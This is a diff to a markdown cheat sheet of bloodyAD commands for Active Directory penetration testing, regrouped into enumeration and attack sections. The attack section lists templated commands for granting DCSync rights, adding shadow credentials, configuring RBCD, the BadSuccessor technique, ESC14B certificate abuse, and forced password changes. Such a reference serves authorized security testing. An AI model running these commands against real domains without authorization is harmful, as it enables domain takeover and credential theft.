@@ -2,117 +2,7 @@
 
 % Active directory, bloodyAD
 
-## Add BadSuccessor
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/PRIVESC
-
-Create a DMSA (Dedicated Managed Service Account) for BadSuccessor attack.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add badSuccessor <dmsa_hostname>
-```
-
-## Add Computer
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/COMPUTER_MANAGEMENT
-
-Create a new computer account in the domain.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add computer <hostname> '<password>'
-```
-
-## Add DCSync Rights
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/PRIVESC
-
-Grant DCSync rights to a user (requires WriteDacl on domain).
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add dcsync <target_username>
-```
-
-## Add  re Record
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/DNS_MANAGEMENT
-
-Add a new DNS record to Active Directory DNS.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add dnsRecord <name> <data>
-```
-
-## Add GenericAll
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/PRIVESC
-
-Give full control of an object to a trustee.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add genericAll <target> <target_username>
-```
-
-## Add Group Member
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/USER_MANAGEMENT
-
-Add a user, computer to a group.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add groupMember <group> <member>
-```
-
-## Add RBCD
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/DELEGATION
-
-Configure Resource-Based Constrained Delegation to allow a service to impersonate users on a target.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add rbcd <target> <service>
-```
-
-## Add Shadow Credentials
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/PRIVESC
-
-Add Key Credentials to a target for PKINIT authentication.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add shadowCredentials <target>
-```
-
-## Add UAC Flag
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/USER_MANAGEMENT
-
-Add UAC flags to a user or computer account.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add uac <target> -f <flag>
-```
-
-## Add UAC Flag Multiple flags
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/USER_MANAGEMENT
-
-Add UAC flags to a user or computer account Multiple flags
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add uac <target> -f <flag1> -f <flag2>
-```
-
-## Add User
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/USER_MANAGEMENT
-
-Create a new user in the domain.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add user <sAMAccountName> '<password>'
-```
-
-## Get Commands
+# Enumeration
 
 ## Get BloodHound Data
 
@@ -120,7 +10,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add user <s
 
 Collect BloodHound data from Active Directory.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get bloodhound
 ```
 
@@ -130,7 +20,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get bloodho
 
 List child objects of a container.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get children
 ```
 
@@ -140,7 +30,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get childre
 
 Retrieve all DNS records from Active Directory.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get dnsDump
 ```
 
@@ -150,7 +40,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get dnsDump
 
 Retrieve all groups a user belongs to.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get membership <target>
 ```
 
@@ -160,7 +50,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get members
 
 Retrieve attributes for a specific object.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get object <target>
 ```
 
@@ -170,7 +60,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get object 
 
 Perform an LDAP search with custom filters.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get search
 ```
 
@@ -180,7 +70,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get search
 
 Display domain trusts in a tree view.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get trusts
 ```
 
@@ -190,7 +80,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get trusts
 
 Find objects you have write access to.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get writable
 ```
 
@@ -200,7 +90,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get writabl
 
 Find objects you have write access to with detailed attribute information.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get writable --detail
 ```
 
@@ -210,150 +100,8 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get writabl
 
 Find deleted objects in Active Directory that you have write access to.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get writable --include-del
-```
-
-## Remove Commands
-
-## Remove DCSync Rights
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/PRIVESC
-
-Remove DCSync rights from a user.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' remove dcsync <target_username>
-```
-
-## Remove DNS Record
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/DNS_MANAGEMENT
-
-Remove a DNS record from Active Directory DNS.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' remove dnsRecord <name> <data>
-```
-
-## Remove GenericAll
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/PRIVESC
-
-Remove full control of a trustee on a target.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' remove genericAll <target> <target_username>
-```
-
-## Remove Group Member
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/USER_MANAGEMENT
-
-Remove a user, computer, or group from a security group.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' remove groupMember <group> <member>
-```
-
-## Remove Object
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/OBJECT_MANAGEMENT
-
-Delete an object from Active Directory.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' remove object <target>
-```
-
-## Remove RBCD
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/DELEGATION
-
-Remove Resource-Based Constrained Delegation configuration from a target.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' remove rbcd <target> <service>
-```
-
-## Remove Shadow Credentials
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/PRIVESC
-
-Remove Key Credentials from a target.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' remove shadowCredentials <target>
-```
-
-## Remove UAC Flag
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/USER_MANAGEMENT
-
-Remove UAC flags from a user or computer account.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' remove uac <target> -f <flag>
-```
-
-Multiple flags:
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' remove uac <target> -f <flag1> -f <flag2>
-```
-
-## Set Commands
-
-## Change attributes of an AD object
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/OBJECT_MANAGEMENT
-
-Modify attributes of an AD object.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' set object <target> <attribute> -v <value>
-```
-
-## Change the owner of an AD object
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/OBJECT_MANAGEMENT
-
-Change the owner of an AD object.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' set owner <target> <owner>
-```
-
-## Change user or computer password.
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/USER_MANAGEMENT
-
-Change a user's or computer's password.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' set password <target> '<new_password>'
-```
-
-## Restore deleted object
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/OBJECT_MANAGEMENT
-
-Restore a deleted object from the AD recycle bin.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' set restore <target>
-```
-
-## Common Attribute Operations
-
-## Modify User Principal Name (UPN)
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/OBJECT_MANAGEMENT
-
-Change a user's UPN attribute.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' set object <target_user> userPrincipalName -v '<new_upn>'
 ```
 
 ## Check User Principal Name (UPN)
@@ -362,61 +110,9 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' set object 
 
 Verify a user's current UPN value.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get object <target_user> --attr userPrincipalName
 ```
-
-## Modify Email Address
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/OBJECT_MANAGEMENT
-
-Set a user's email address.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' set object <target_user> mail -v '<email>'
-```
-
-## Modify altSecurityIdentities Attribute (ESC14B)
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/OBJECT_MANAGEMENT
-
-Modify the altSecurityIdentities attribute for certificate-based attacks.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' set object <target_user> altSecurityIdentities -v 'X509:<RFC822>email@domain.com'
-```
-
-## Write Service Principal Name (SPN)
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/OBJECT_MANAGEMENT
-
-Add an SPN to a target object for Kerberoasting.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' set object <target> servicePrincipalName -v '<service>/<hostname>'
-```
-
-## Enable a Disabled Account
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/USER_MANAGEMENT
-
-Enable a disabled user account by removing the ACCOUNTDISABLE flag.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' remove uac <target_user> -f ACCOUNTDISABLE
-```
-
-## Add Delegation Flag
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/DELEGATION
-
-Add the TRUSTED_TO_AUTH_FOR_DELEGATION flag to enable S4U2Self.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add uac <target_user> -f TRUSTED_TO_AUTH_FOR_DELEGATION
-```
-
-## Special Queries
 
 ## Kerberoast Detection
 
@@ -424,7 +120,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add uac <ta
 
 Find Kerberoastable accounts.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get search --filter '(&(samAccountType=805306368)(servicePrincipalName=*))' --attr sAMAccountName
 ```
 
@@ -434,11 +130,647 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get search 
 
 Find accounts vulnerable to AS-REP roasting.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
 ```
 
-## Credential Access
+## Check Machine Account Quota
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION
+
+Check the Machine Account Quota (MAQ) setting.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get object '<DC=dc,DC=dc>' --attr ms-DS-MachineAccountQuota
+```
+
+## MSLDAP adinfo
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
+
+Print detailed Active Directory info.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap adinfo
+```
+
+## MSLDAP allschemaentry
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
+
+Fetch all schema object entry objects.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap allschemaentry
+```
+
+## MSLDAP asrep
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
+
+Fetch ASREP-roastable user accounts.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap asrep
+```
+
+## MSLDAP computeraddr
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
+
+Fetch all computer accounts.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap computeraddr
+```
+
+## MSLDAP constrained
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
+
+List all constrained delegation objects.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap constrained
+```
+
+## MSLDAP dadms
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
+
+List all members of the domain administrators group.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dadms
+```
+
+## MSLDAP dmsas
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
+
+List all delegated managed service accounts (DMSA).
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dmsas
+```
+
+## MSLDAP dn2sam
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
+
+Fetch the sAMAccountName of an object based on the DN.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dn2sam <dn>
+```
+
+## MSLDAP dn2sid
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
+
+Fetch the objectSid of an object based on the DN.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dn2sid <dn>
+```
+
+## MSLDAP dnsdump
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
+
+Dump DNS records from Active Directory.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dnsdump
+```
+
+## MSLDAP dump
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
+
+Fetch ALL user and machine accounts from the domain.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dump
+```
+
+## MSLDAP genschema
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
+
+Generate schema data (takes a long time).
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap genschema
+```
+
+## MSLDAP getsd
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
+
+Fetch security info for a given DN.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap getsd <dn>
+```
+
+## MSLDAP gmsa
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
+
+List all managed service accounts (MSA) and retrieve passwords if possible.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap gmsa
+```
+
+## MSLDAP gpos
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
+
+Fetch Group Policy Objects.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap gpos
+```
+
+## MSLDAP groupmembers
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
+
+Return all member users in a group specified by DN.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap groupmembers <dn>
+```
+
+## MSLDAP groupmembership
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
+
+Fetch all groupnames the user is a member of for a given DN.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap groupmembership <dn>
+```
+
+## MSLDAP ldapinfo
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
+
+Print detailed LDAP connection info (DSA).
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap ldapinfo
+```
+
+## MSLDAP machine
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
+
+Fetch a machine object based on the sAMAccountName.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap machine <samaccountname>
+```
+
+## MSLDAP pre2000
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
+
+List potentially abusable machine accounts created with pre-Windows-2000 flag.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap pre2000
+```
+
+## MSLDAP query
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
+
+Perform a raw LDAP query.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap query <query>
+```
+
+## MSLDAP s4u2proxy
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
+
+List all S4U2Proxy objects.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap s4u2proxy
+```
+
+## MSLDAP sam2dn
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
+
+Fetch the DN of an object based on the sAMAccountName.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap sam2dn <sAMAccountName>
+```
+
+## MSLDAP schemaentry
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
+
+Fetch a schema object entry based on the DN.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap schemaentry <cn>
+```
+
+## MSLDAP sid2dn
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
+
+Fetch the DN of an object based on the objectSid.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap sid2dn <sid>
+```
+
+## MSLDAP sidresolv
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
+
+Return the domain and username for a SID.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap sidresolv <sid>
+```
+
+## MSLDAP spns
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
+
+Fetch kerberoastable user accounts.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap spns
+```
+
+## MSLDAP tree
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
+
+Print a tree from the given DN with specified depth.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap tree
+```
+
+## MSLDAP trusts
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
+
+Fetch domain trusts.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap trusts
+```
+
+## MSLDAP unconstrained
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
+
+List all unconstrained delegation objects.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap unconstrained
+```
+
+## MSLDAP user
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
+
+Fetch a user object based on the sAMAccountName.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap user <samaccountname>
+```
+
+## MSLDAP whoami
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
+
+Full whoami information.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap whoami
+```
+
+## MSLDAP whoamiraw
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
+
+Simple whoami information.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap whoamiraw
+```
+
+# Attack
+
+## Add BadSuccessor
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/PRIVESC
+
+Create a DMSA (Dedicated Managed Service Account) for BadSuccessor attack.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add badSuccessor <dmsa_hostname>
+```
+
+## Add Computer
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/COMPUTER_MANAGEMENT
+
+Create a new computer account in the domain.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add computer <hostname> '<password>'
+```
+
+## Add DCSync Rights
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/PRIVESC
+
+Grant DCSync rights to a user (requires WriteDacl on domain).
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add dcsync <target_username>
+```
+
+## Add DNS Record
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/DNS_MANAGEMENT
+
+Add a new DNS record to Active Directory DNS.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add dnsRecord <name> <data>
+```
+
+## Add GenericAll
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/PRIVESC
+
+Give full control of an object to a trustee.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add genericAll <target> <target_username>
+```
+
+## Add Group Member
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/USER_MANAGEMENT
+
+Add a user, computer to a group.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add groupMember <group> <member>
+```
+
+## Add RBCD
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/DELEGATION
+
+Configure Resource-Based Constrained Delegation to allow a service to impersonate users on a target.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add rbcd <target> <service>
+```
+
+## Add Shadow Credentials
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/PRIVESC
+
+Add Key Credentials to a target for PKINIT authentication.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add shadowCredentials <target>
+```
+
+## Add UAC Flag
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/USER_MANAGEMENT
+
+Add UAC flags to a user or computer account.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add uac <target> -f <flag>
+```
+
+## Add UAC Flag Multiple flags
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/USER_MANAGEMENT
+
+Add UAC flags to a user or computer account Multiple flags
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add uac <target> -f <flag1> -f <flag2>
+```
+
+## Add User
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/USER_MANAGEMENT
+
+Create a new user in the domain.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add user <sAMAccountName> '<password>'
+```
+
+## Remove DCSync Rights
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/PRIVESC
+
+Remove DCSync rights from a user.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' remove dcsync <target_username>
+```
+
+## Remove DNS Record
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/DNS_MANAGEMENT
+
+Remove a DNS record from Active Directory DNS.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' remove dnsRecord <name> <data>
+```
+
+## Remove GenericAll
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/PRIVESC
+
+Remove full control of a trustee on a target.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' remove genericAll <target> <target_username>
+```
+
+## Remove Group Member
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/USER_MANAGEMENT
+
+Remove a user, computer, or group from a security group.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' remove groupMember <group> <member>
+```
+
+## Remove Object
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/OBJECT_MANAGEMENT
+
+Delete an object from Active Directory.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' remove object <target>
+```
+
+## Remove RBCD
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/DELEGATION
+
+Remove Resource-Based Constrained Delegation configuration from a target.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' remove rbcd <target> <service>
+```
+
+## Remove Shadow Credentials
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/PRIVESC
+
+Remove Key Credentials from a target.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' remove shadowCredentials <target>
+```
+
+## Remove UAC Flag
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/USER_MANAGEMENT
+
+Remove UAC flags from a user or computer account.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' remove uac <target> -f <flag>
+```
+
+Multiple flags:
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' remove uac <target> -f <flag1> -f <flag2>
+```
+
+## Change attributes of an AD object
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/OBJECT_MANAGEMENT
+
+Modify attributes of an AD object.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' set object <target> <attribute> -v <value>
+```
+
+## Change the owner of an AD object
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/OBJECT_MANAGEMENT
+
+Change the owner of an AD object.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' set owner <target> <owner>
+```
+
+## Change user or computer password
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/USER_MANAGEMENT
+
+Change a user's or computer's password.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' set password <target> '<new_password>'
+```
+
+## Restore deleted object
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/OBJECT_MANAGEMENT
+
+Restore a deleted object from the AD recycle bin.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' set restore <target>
+```
+
+## Modify User Principal Name (UPN)
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/OBJECT_MANAGEMENT
+
+Change a user's UPN attribute.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' set object <target_user> userPrincipalName -v '<new_upn>'
+```
+
+## Modify Email Address
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/OBJECT_MANAGEMENT
+
+Set a user's email address.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' set object <target_user> mail -v '<email>'
+```
+
+## Modify altSecurityIdentities Attribute (ESC14B)
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/OBJECT_MANAGEMENT
+
+Modify the altSecurityIdentities attribute for certificate-based attacks.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' set object <target_user> altSecurityIdentities -v 'X509:<RFC822>email@domain.com'
+```
+
+## Write Service Principal Name (SPN)
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/OBJECT_MANAGEMENT
+
+Add an SPN to a target object for Kerberoasting.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' set object <target> servicePrincipalName -v '<service>/<hostname>'
+```
+
+## Enable a Disabled Account
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/USER_MANAGEMENT
+
+Enable a disabled user account by removing the ACCOUNTDISABLE flag.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' remove uac <target_user> -f ACCOUNTDISABLE
+```
+
+## Add Delegation Flag
+
+#platform/Windows #target/REMOTE #protocol/LDAP #cat/DELEGATION
+
+Add the TRUSTED_TO_AUTH_FOR_DELEGATION flag to enable S4U2Self.
+
+```sh
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add uac <target_user> -f TRUSTED_TO_AUTH_FOR_DELEGATION
+```
